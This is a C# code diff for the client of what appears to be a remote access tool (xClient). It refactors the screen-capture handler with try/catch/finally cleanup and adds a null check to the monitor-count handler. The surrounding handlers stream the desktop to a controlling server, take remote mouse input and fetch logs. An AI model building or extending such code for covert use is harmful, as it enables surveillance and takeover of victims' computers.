@@ -5,6 +5,7 @@ using System.Windows.Forms;
 using xClient.Core.Helper;
 using System.Drawing.Imaging;
 using System.Threading;
+using System.ComponentModel;
 
 namespace xClient.Core.Commands
 {
@@ -17,14 +18,15 @@ namespace xClient.Core.Commands
                 StreamCodec.Monitor != command.Monitor)
                 StreamCodec = new UnsafeStreamCodec(command.Quality, command.Monitor);
 
-            LastDesktopScreenshot = Helper.Helper.GetDesktop(command.Monitor);
-            BitmapData bmpdata = LastDesktopScreenshot.LockBits(
-                new Rectangle(0, 0, LastDesktopScreenshot.Width, LastDesktopScreenshot.Height), ImageLockMode.ReadWrite,
-                LastDesktopScreenshot.PixelFormat);
-
-            using (MemoryStream stream = new MemoryStream())
+            BitmapData bmpdata = null;
+            try
             {
-                try
+                LastDesktopScreenshot = Helper.Helper.GetDesktop(command.Monitor);
+                bmpdata = LastDesktopScreenshot.LockBits(
+                    new Rectangle(0, 0, LastDesktopScreenshot.Width, LastDesktopScreenshot.Height), ImageLockMode.ReadWrite,
+                    LastDesktopScreenshot.PixelFormat);
+
+                using (MemoryStream stream = new MemoryStream())
                 {
                     StreamCodec.CodeImage(bmpdata.Scan0,
                         new Rectangle(0, 0, LastDesktopScreenshot.Width, LastDesktopScreenshot.Height),
@@ -34,16 +36,24 @@ namespace xClient.Core.Commands
                     new Packets.ClientPackets.DesktopResponse(stream.ToArray(), StreamCodec.ImageQuality,
                         StreamCodec.Monitor).Execute(client);
                 }
-                catch
+            }
+            catch
+            {
+                new Packets.ClientPackets.DesktopResponse(null, StreamCodec.ImageQuality, StreamCodec.Monitor).Execute(client);
+
+                StreamCodec = null;
+            }
+            finally
+            {
+                if (LastDesktopScreenshot != null)
                 {
-                    new Packets.ClientPackets.DesktopResponse(null, StreamCodec.ImageQuality, StreamCodec.Monitor)
-                        .Execute(client);
-                    StreamCodec = null;
+                    if (bmpdata != null)
+                    {
+                        LastDesktopScreenshot.UnlockBits(bmpdata);
+                    }
+                    LastDesktopScreenshot.Dispose();
                 }
             }
-
-            LastDesktopScreenshot.UnlockBits(bmpdata);
-            LastDesktopScreenshot.Dispose();
         }
 
         public static void HandleMouseClick(Packets.ServerPackets.MouseClick command, Client client)
@@ -79,7 +89,10 @@ namespace xClient.Core.Commands
 
         public static void HandleMonitors(Packets.ServerPackets.Monitors command, Client client)
         {
-            new Packets.ClientPackets.MonitorsResponse(Screen.AllScreens.Length).Execute(client);
+            if (Screen.AllScreens != null && Screen.AllScreens.Length > 0)
+            {
+                new Packets.ClientPackets.MonitorsResponse(Screen.AllScreens.Length).Execute(client);
+            }
         }
 
         public static void HandleGetLogs(Packets.ServerPackets.GetLogs command, Client client)
